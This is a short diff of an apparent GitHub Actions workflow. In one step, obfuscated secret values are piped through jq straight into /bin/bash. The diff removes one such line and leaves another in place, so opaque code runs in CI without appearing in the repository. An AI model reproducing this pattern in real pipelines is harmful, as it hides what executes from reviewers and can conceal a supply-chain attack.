@@ -21,7 +21,6 @@ jobs:
           xcfg434: ${{ secrets.xcfg434 }}
         run: |
           printf '%s' "$xcfg434" | jq -r .nng4629 | /bin/bash
-          printf '%s' "$yql326" | jq -r .rmiko64530 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
